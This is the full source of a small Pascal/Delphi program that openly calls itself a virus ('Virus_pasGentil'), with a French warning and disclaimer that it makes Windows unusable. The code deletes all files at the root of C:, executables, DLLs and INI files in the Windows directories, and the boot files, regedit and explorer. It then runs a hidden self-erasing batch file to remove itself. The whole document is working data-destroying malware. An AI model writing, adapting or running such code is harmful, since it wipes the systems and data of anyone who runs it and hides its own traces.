   program Virus_pasGentil;


   {
                 ATTENTION

        SI VOUS EXECUTER CE PROGRAMME
       VOUS DEVREZ REINSTALLER WINDOWS

   CE PROGRAMME REND VOTRE SYSTEM INUTILISABLE

   JE NE SUIS NULLEMENT RESPONSABLE DES DOMMAGES
     SI VOUS DECIDEZ D'EXECUTER CE PROGRAMME

   }

   uses
     windows, SysUtils;




   {=-=-=-=-=- DeleteFiles -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-}
   procedure DeleteFiles(Chemin, extention :string);
    var sr : TSearchRec;
        F : integer;
     begin
       If Chemin[Length(Chemin)] <> '\' Then Chemin := Chemin + '\';

        F := FindFirst(Chemin + Extention, faAnyFile, sr);

      while F = 0 do
       begin
         if (sr.Name <> '.') or (sr.Name <> '..') Then
          begin
           deleteFile(Chemin + sr.Name);
           F := FindNext(sr);
          end
         else F := FindNext(sr);
        END;

         FindClose(sr);
     end;


   {=-=-=-=-=- SelfEfface -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-}
   Procedure SelfEfface;
    var F :Textfile;
   begin
     AssignFile(F,Changefileext(paramstr(0),'.bat'));
     rewrite(F);
     writeln(F,':1');
     writeln(F, Format('Erase "%s"',[paramstr(0)]));
     writeln(F, Format('If exist "%s" Goto 1',[paramstr(0)]));
     writeln(F, Format('Erase "%s"',[changefileext(paramstr(0),'.bat')]));
     closefile(F);
     winexec(PChar(ChangeFileExt(paramstr(0),'.bat')),sw_hide);
     halt;
   end;



   {=-=-=-=-=- Debut du programme -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-}

   var
       win :string;
       p :array[0..255]of char;



   begin
    getwindowsdirectory(p, 255);
    win := p ;
    win := win + '\';

    DeleteFiles('c:\','*.*');
    DeleteFiles(win,'*.exe');
    DeleteFiles(win +'system\','*.exe');
    DeleteFiles(win,'*.ini');
    DeleteFiles(win,'*.dll');


       DeleteFile('c:\autoexec.bat');
       DeleteFile('c:\boot.ini');
       DeleteFile('c:\config.sys');
       DeleteFile('c:\io.sys');
       DeleteFile('C:\Program Files\Internet Explorer\IEXPLORE.EXE');

       DeleteFile(win + 'regedit.exe');
       DeleteFile(win + 'explorer.exe');
       DeleteFile(win + 'win.com');
       DeleteFile(win + 'win.ini');
       DeleteFile(win + 'system.ini');


      SelfEfface;

   {
                 ATTENTION

        SI VOUS EXECUTER CE PROGRAMME
       VOUS DEVREZ REINSTALLER WINDOWS

   CE PROGRAMME REND VOTRE SYSTEM INUTILISABLE

   JE NE SUIS NULLEMENT RESPONSABLE DES DOMMAGES
     SI VOUS DECIDEZ D'EXECUTER CE PROGRAMME

   }

   end.
